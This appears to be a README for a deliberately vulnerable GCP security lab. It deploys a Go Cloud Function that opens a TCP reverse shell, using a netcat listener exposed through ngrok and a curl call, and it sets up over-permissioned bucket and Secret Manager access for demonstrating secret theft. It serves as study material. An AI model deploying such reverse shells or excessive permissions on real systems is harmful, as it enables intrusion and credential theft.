# Puma Prey Cheetah

Cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

## Installing Prerequisites

* [Google Cloud SDK](https://cloud.google.com/sdk/install)
* [Node.js / NPM](https://nodejs.org/en/download/)
* [Function Deployment Service Account](https://cloud.google.com/functions/docs/concepts/iam#cloud_functions_service_account)

## Deploying The Function

### Serverless Framework

Follow [these steps](https://serverless.com/framework/docs/providers/google/guide/credentials/) to generate a credentials file. Deploy the function by specifying your GCP project ID and the **absolute path** of the credentials file.

```bash
cd /PATH/TO/cheetah/src/cheetah
npm install

# Optional: Create protected storage bucket that the function role has access to.
export WITH_BUCKET=true
export BUCKET_SUFFIX=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.

GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json
npx serverless deploy
```

In addition to deploying the function, if `WITH_BUCKET=true` and `BUCKET_SUFFIX` is set, this will create a private storage bucket. The function role will have unnecessary permissions to access the bucket.

To upload a secret image to the bucket, run the following:

```bash
gcloud auth activate-service-account --key-file /PATH/TO/.gcloud/keyfile.json
gsutil cp /PATH/TO/assets/* "gs://cheetah-$BUCKET_SUFFIX"
```

You can also use Cheetah to demonstrate how a compromised function could be used to access the GCP Secret Manager. In order to set this up:

* Enable "Secret Manager API" in the [API dashboard](https://console.cloud.google.com/apis/dashboard).
* Recreate your service account and add the "Secret Manager Admin" role.
* As [the Serverless Framework always uses the App Engine default service account](https://github.com/serverless/serverless-google-cloudfunctions/issues/161), 
* Run the following:

```bash
gcloud config set project YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID # If you receive a warning like the following, you can just ignore it: WARNING: You do not appear to have access to project [...] or it does not exist.

gcloud secrets create cheetah-database-password --replication-policy automatic
echo -n 'RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9uJ3Qga25vdyBldmlsIG9yIGplYWxvdXN5IG9yIGRpc2NvbnRlbnQu' | gcloud secrets versions add cheetah-database-password --data-file="-"
gcloud secrets add-iam-policy-binding cheetah-database-password --member serviceAccount:YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID@appspot.gserviceaccount.com --role roles/secretmanager.secretAccessor
```

### Native GCloud Commands

To deploy natively without the serverless framework, configure `gcloud` in the Terminal to authentication as the deployment service account. Then, deploy the function.

```bash
gcloud auth activate-service-account --key-file ~/.gcloud/keyfile.json
gcloud functions deploy cheetah --entry-point Cheetah --runtime go111 --trigger-http --service-account=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID@appspot.gserviceaccount.com
```

## Testing in GCP

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
script/cheetah --url-id YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
```

See [here](../script/USAGE.md) for more details on how to use this script.

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details:

```bash
curl "https://$GCP_REGION-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file.

## Teardown

```bash
cd /PATH/TO/cheetah/src/cheetah
export SERVERLESS_CHEETAH_BUCKET=$(gsutil ls gs://sls-cheetah-dev*)
gsutil rm $SERVERLESS_CHEETAH_BUCKET**
GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json
npx serverless remove
```

## Linting

```bash
cd /PATH/TO/cheetah/src/cheetah
go get -u golang.org/x/lint/golint
npm run lint
```

## Learning More

Read [documentation](docs) on what you can accomplish once you connect to the runtime via Cheetah.

## Serverless Go Template

Creating the original function template using the serverless framework.

```bash
cd src
serverless create --template google-go --path cheetah
```

## Exploring Serverless

Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/google/) for more information.
